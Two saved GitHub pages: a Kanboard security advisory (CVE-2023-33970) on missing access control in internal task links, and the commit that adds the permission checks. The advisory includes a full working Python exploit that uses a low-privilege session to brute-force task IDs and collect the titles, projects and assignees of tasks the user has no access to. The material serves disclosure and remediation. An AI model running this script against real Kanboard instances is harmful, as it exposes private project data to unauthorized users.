=== Content from github.com_38e65ae4_20250115_084637.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkanboard%2Fkanboard%2Fsecurity%2Fadvisories%2FGHSA-wfch-8rhv-v286)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkanboard%2Fkanboard%2Fsecurity%2Fadvisories%2FGHSA-wfch-8rhv-v286)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=kanboard%2Fkanboard)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[kanboard](/kanboard)
/
**[kanboard](/kanboard/kanboard)**
Public

* [Notifications](/login?return_to=%2Fkanboard%2Fkanboard) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fkanboard%2Fkanboard)
* [Star
   8.6k](/login?return_to=%2Fkanboard%2Fkanboard)

* [Code](/kanboard/kanboard)
* [Issues
  152](/kanboard/kanboard/issues)
* [Pull requests
  6](/kanboard/kanboard/pulls)
* [Discussions](/kanboard/kanboard/discussions)
* [Actions](/kanboard/kanboard/actions)
* [Security](/kanboard/kanboard/security)
* [Insights](/kanboard/kanboard/pulse)

Additional navigation options

* [Code](/kanboard/kanboard)
* [Issues](/kanboard/kanboard/issues)
* [Pull requests](/kanboard/kanboard/pulls)
* [Discussions](/kanboard/kanboard/discussions)
* [Actions](/kanboard/kanboard/actions)
* [Security](/kanboard/kanboard/security)
* [Insights](/kanboard/kanboard/pulse)

# Missing access control in internal task links feature

Moderate

[fguillot](/fguillot)
published
GHSA-wfch-8rhv-v286
Jun 3, 2023

## Package

No package listed

## Affected versions

<= 1.2.29

## Patched versions

None

## Description

### Summary

A vulnerability related to a **missing access control** was found, which allows a **User with lowest privileges** to leak all the tasks and projects titles within the software, even if they are not invited or it's a personal project.

### Details

The vulnerability lays in the function `create()` in **/app/Model/TaskLinkModel.php** file, at line **166**.

**Note:** I believe that the `update()` also has the same issue.

```
public function create($task_id, $opposite_task_id, $link_id)
    {
        $this->db->startTransaction();

        $opposite_link_id = $this->linkModel->getOppositeLinkId($link_id);
        $task_link_id1 = $this->createTaskLink($task_id, $opposite_task_id, $link_id);
        $task_link_id2 = $this->createTaskLink($opposite_task_id, $task_id, $opposite_link_id);

        if ($task_link_id1 === false || $task_link_id2 === false) {
            $this->db->cancelTransaction();
            return false;
        }

        $this->db->closeTransaction();
        $this->fireEvents(array($task_link_id1, $task_link_id2), self::EVENT_CREATE_UPDATE);

        return $task_link_id1;
    }
```

As we can see, there are **no checks** being made to the `$opposite_task_id` variable to check if the user that made the request has permission/access to the **opposite task**.

### PoC

1. Go to any task you own, click on the feature **Add Internal Link** and click on Save.
2. Intercept the request and change the **opposite\_task\_id** to any task id you want.
3. Go back to your task, and as you can see you can leak the task and project title of any projects within the software

**Note:** I've made an over-engineered but reliable exploit to leak every task and project title within the software with a user with the role **User**, being the lowest privileges you can get.

You can run the python script using the command

`python3 kanboard_leak_tp.py <TARGET> <YOUR_SESSION_ID> <YOUR_TASK_ID>`

kanboard\_leak\_tp\_PoC.mp4

#### Exploit

```
import re
import sys
import requests
from prettytable import PrettyTable
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Variables
CSRF_TOKEN = ""
TARGET_URL = sys.argv[1]
SESSION_ID = sys.argv[2]
MY_TASK_ID = sys.argv[3]
MY_TASK_URL = f"{TARGET_URL}/task/{MY_TASK_ID}"
CREATE_LINK = f"{TARGET_URL}/task/{MY_TASK_ID}/internal-link/save"
REMOVE_LINK = f"{TARGET_URL}/?controller=TaskInternalLinkController&action=remove&link_id=%s&task_id={MY_TASK_ID}&csrf_token="

# Define tasks table
table = PrettyTable()
table.field_names = ["Task Title", "Project Title", "Task Column", "Task Assigned"]
table.align["Task Title"] = "l"
table.align["Project Title"] = "l"
table.align["Task Column"] = "l"
table.align["Task Assigned"] = "l"

def logo():
    print("""
  _  __          _    _    ___ _____
 | |/ /__ _ _ _ | |__| |  | _ \_   _|
 | ' </ _` | ' \| '_ \ |__|  _/ | |
 |_|\_\__,_|_||_|_.__/____|_|   |_|
                  Exploit made by: castilho
          """)

def get_csrf_token(response_html):
    # Extract CSRF token from the response HTML using regex
    csrf_token_regex = r'name="csrf_token" value="([^"]+)'
    match = re.search(csrf_token_regex, response_html)

    if match:
        csrf_token = match.group(1)
        return csrf_token

    return ""

def generate_session():
    # Create a session with necessary headers and cookies
    session = requests.Session()
    headers = {'X-Requested-With': 'XMLHttpRequest'}
    session.headers.update(headers)
    session.cookies.update({'KB_SID': SESSION_ID})
    return session

def main():
    # Variables
    number_tasks = 0

    session = generate_session()
    my_task_response = session.get(MY_TASK_URL)

    print(f"[*] Retrieving HTML content from the session...")

    CSRF_TOKEN = get_csrf_token(my_task_response.text)

    # Check if we could retrieve the CSRF Token
    if CSRF_TOKEN == "":
        print("[-] Couldn't retrieve the CSRF Token. Please check your Session ID or Task ID...")
        exit()

    print(f"[+] Obtained CSRF token: {CSRF_TOKEN}\n")
    print("[*] Started brute-forcing tasks...")

    # Brute-force tasks in projects
    for task_id in range(1000):

        # Multipart data to create an internal link
        multi_data = MultipartEncoder(
            fields={
                'csrf_token': CSRF_TOKEN,
                'opposite_task_id': str(task_id),
                'link_id': '1',
                'title': '',
            },
            boundary='----WebKitFormBoundaryhkj3WRLYXccSclPh'
        )

        # POST request to create an internal link
        create_link_response = session.post(CREATE_LINK, headers={'Content-Type': multi_data.content_type}, data=multi_data)

        # Check if a task was found
        if len(create_link_response.content) == 0:

            # Do a GET request to our task endpoint
            # to retrieve the found task values
            my_task_response = session.get(MY_TASK_URL)

            # Regex to find the values of project title, assigned user, and link ID
            pattern_project_values = r'<a href=".+?"[^>]*>([^<]+)</a>\s*\(([^)]+)\)'
            pattern_assigned_user = r'<a href="/user/show/\d+" class="" title=\'\' >(.*?)</a>'
            pattern_link_id = r'/\?controller=TaskInternalLinkController&amp;action=confirm&amp;link_id=(\d+)'

            # Make the necessary searches
            match_project = re.search(pattern_project_values, my_task_response.text)
            match_assigned = re.search(pattern_assigned_user, my_task_response.text)
            match_link_id = re.search(pattern_link_id, my_task_response.text)

            # Check if a task and project were found along with their link ID
            if match_project and match_link_id:

                # Check if someone is assigned to that task
                if match_assigned:
                    user_assigned = match_assigned.group(1)
                else:
                    user_assigned = "Not Assigned"

                # Get the link of the task and project values
                task_link_id = match_link_id.group(1)
                task_value, project_value = match_project.groups()

                if len(project_value.split(" - ")) > 1:
                    task_column = project_value.split(" - ")[1]
                    project_name = project_value.split(" - ")[0]
                else:
                    task_column = project_value.split(" - ")[0]
                    project_name = ""

                table.add_row([task_value, project_name, task_column, user_assigned])
                session.get((REMOVE_LINK % task_link_id) + CSRF_TOKEN)

                number_tasks += 1

    # Display the final leaked information
    if number_tasks > 0:
        print(f"[+] Number of tasks found: {number_tasks}")
        print("[+] Table of all tasks in all projects:\n")
        print(table)
    else:
        print("[-] Didn't find any tasks. It's either patched or your company needs to put in some work... :/\n")

if __name__ == '__main__':
    logo()
    main()
```
### Impact

A vulnerability related to **broken access control** was found, which allows a **User with lowest privileges** to leak all the tasks and project titles within the software, even if they are not invited or it's a personal project. This could also lead to private/critical information being leaked if such information is in the title.

### Severity

Moderate

5.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N

### CVE ID

CVE-2023-33970

### Weaknesses

[CWE-284](/advisories?query=cwe%3A284)

### Credits

* [![@castilho101](https://avatars.githubusercontent.com/u/60802176?s=40&v=4)](/castilho101)
  [castilho101](/castilho101)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_04c9cf90_20250115_084636.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkanboard%2Fkanboard%2Fcommit%2Fb501ef44bc28ee9cf603a4fa446ee121d66f652f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkanboard%2Fkanboard%2Fcommit%2Fb501ef44bc28ee9cf603a4fa446ee121d66f652f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=kanboard%2Fkanboard)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[kanboard](/kanboard)
/
**[kanboard](/kanboard/kanboard)**
Public

* [Notifications](/login?return_to=%2Fkanboard%2Fkanboard) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fkanboard%2Fkanboard)
* [Star
   8.6k](/login?return_to=%2Fkanboard%2Fkanboard)

* [Code](/kanboard/kanboard)
* [Issues
  152](/kanboard/kanboard/issues)
* [Pull requests
  6](/kanboard/kanboard/pulls)
* [Discussions](/kanboard/kanboard/discussions)
* [Actions](/kanboard/kanboard/actions)
* [Security](/kanboard/kanboard/security)
* [Insights](/kanboard/kanboard/pulse)

Additional navigation options

* [Code](/kanboard/kanboard)
* [Issues](/kanboard/kanboard/issues)
* [Pull requests](/kanboard/kanboard/pulls)
* [Discussions](/kanboard/kanboard/discussions)
* [Actions](/kanboard/kanboard/actions)
* [Security](/kanboard/kanboard/security)
* [Insights](/kanboard/kanboard/pulse)

## Commit

[Permalink](/kanboard/kanboard/commit/b501ef44bc28ee9cf603a4fa446ee121d66f652f)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Add missing permission check when creating/updating internal links

[Browse files](/kanboard/kanboard/tree/b501ef44bc28ee9cf603a4fa446ee121d66f652f)
Browse the repository at this point in the history

* Loading branch information

[![@fguillot](https://avatars.githubusercontent.com/u/323546?s=40&v=4)](/fguillot)

[fguillot](/kanboard/kanboard/commits?author=fguillot "View all commits by fguillot")
committed
Jun 3, 2023

1 parent
[05f1d23](/kanboard/kanboard/commit/05f1d23d821152cd61536d3b09e522c0f7573e3c)

commit b501ef4

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**31 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* app

  + Api/Procedure

    - app/Api/Procedure/TaskLinkProcedure.php
      [TaskLinkProcedure.php](#diff-cc52f69805892d803b6feb5debe048ba0f92ed85232d136fdbcead2007f64042)
  + Controller

    - app/Controller/TaskInternalLinkController.php
      [TaskInternalLinkController.php](#diff-258b93c1979fb856f92cdbf7a29a604c4dbb3d21f8cb892621058cceff87540d)

## There are no files selected for viewing

18 changes: 18 additions & 0 deletions

18
[app/Api/Procedure/TaskLinkProcedure.php](#diff-cc52f69805892d803b6feb5debe048ba0f92ed85232d136fdbcead2007f64042 "app/Api/Procedure/TaskLinkProcedure.php")

Show comments

[View file](/kanboard/kanboard/blob/b501ef44bc28ee9cf603a4fa446ee121d66f652f/app/Api/Procedure/TaskLinkProcedure.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -51,6 +51,15 @@ public function getAllTaskLinks($task\_id) |
|  |  | public function createTaskLink($task\_id, $opposite\_task\_id, $link\_id) |
|  |  | { |
|  |  | TaskAuthorization::getInstance($this->container)->check($this->getClassName(), 'createTaskLink', $task\_id); |
|  |  |  |
|  |  | if ($this->userSession->isLogged()) { |
|  |  | $opposite\_task = $this->taskFinderModel->getById($opposite\_task\_id); |
|  |  |  |
|  |  | if (! $this->projectPermissionModel->isUserAllowed($opposite\_task['project\_id'], $this->userSession->getId())) { |
|  |  | return false; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | return $this->taskLinkModel->create($task\_id, $opposite\_task\_id, $link\_id); |
|  |  | } |
|  |  |  |
| Expand All | | @@ -67,6 +76,15 @@ public function createTaskLink($task\_id, $opposite\_task\_id, $link\_id) |
|  |  | public function updateTaskLink($task\_link\_id, $task\_id, $opposite\_task\_id, $link\_id) |
|  |  | { |
|  |  | TaskAuthorization::getInstance($this->container)->check($this->getClassName(), 'updateTaskLink', $task\_id); |
|  |  |  |
|  |  | if ($this->userSession->isLogged()) { |
|  |  | $opposite\_task = $this->taskFinderModel->getById($opposite\_task\_id); |
|  |  |  |
|  |  | if (! $this->projectPermissionModel->isUserAllowed($opposite\_task['project\_id'], $this->userSession->getId())) { |
|  |  | return false; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | return $this->taskLinkModel->update($task\_link\_id, $task\_id, $opposite\_task\_id, $link\_id); |
|  |  | } |
|  |  |  |
| Expand Down | |  |

13 changes: 13 additions & 0 deletions

13
[app/Controller/TaskInternalLinkController.php](#diff-258b93c1979fb856f92cdbf7a29a604c4dbb3d21f8cb892621058cceff87540d "app/Controller/TaskInternalLinkController.php")

Show comments

[View file](/kanboard/kanboard/blob/b501ef44bc28ee9cf603a4fa446ee121d66f652f/app/Controller/TaskInternalLinkController.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,7 @@ |
|  |  |  |
|  |  | namespace Kanboard\Controller; |
|  |  |  |
|  |  | use Kanboard\Core\Controller\AccessForbiddenException; |
|  |  | use Kanboard\Core\Controller\PageNotFoundException; |
|  |  |  |
|  |  | /\*\* |
| Expand Down  Expand Up | | @@ -53,6 +54,12 @@ public function save() |
|  |  | list($valid, $errors) = $this->taskLinkValidator->validateCreation($values); |
|  |  |  |
|  |  | if ($valid) { |
|  |  | $opposite\_task = $this->taskFinderModel->getById($values['opposite\_task\_id']); |
|  |  |  |
|  |  | if (! $this->projectPermissionModel->isUserAllowed($opposite\_task['project\_id'], $this->userSession->getId())) { |
|  |  | throw new AccessForbiddenException(); |
|  |  | } |
|  |  |  |
|  |  | if ($this->taskLinkModel->create($values['task\_id'], $values['opposite\_task\_id'], $values['link\_id']) !== false) { |
|  |  | $this->flash->success(t('Link added successfully.')); |
|  |  |  |
| Expand Down  Expand Up | | @@ -121,6 +128,12 @@ public function update() |
|  |  | list($valid, $errors) = $this->taskLinkValidator->validateModification($values); |
|  |  |  |
|  |  | if ($valid) { |
|  |  | $opposite\_task = $this->taskFinderModel->getById($values['opposite\_task\_id']); |
|  |  |  |
|  |  | if (! $this->projectPermissionModel->isUserAllowed($opposite\_task['project\_id'], $this->userSession->getId())) { |
|  |  | throw new AccessForbiddenException(); |
|  |  | } |
|  |  |  |
|  |  | if ($this->taskLinkModel->update($values['id'], $values['task\_id'], $values['opposite\_task\_id'], $values['link\_id'])) { |
|  |  | $this->flash->success(t('Link updated successfully.')); |
|  |  | return $this->response->redirect($this->helper->url->to('TaskViewController', 'show', array('task\_id' => $task['id'])).'#links'); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b501ef4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkanboard%2Fkanboard%2Fcommit%2Fb501ef44bc28ee9cf603a4fa446ee121d66f652f) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


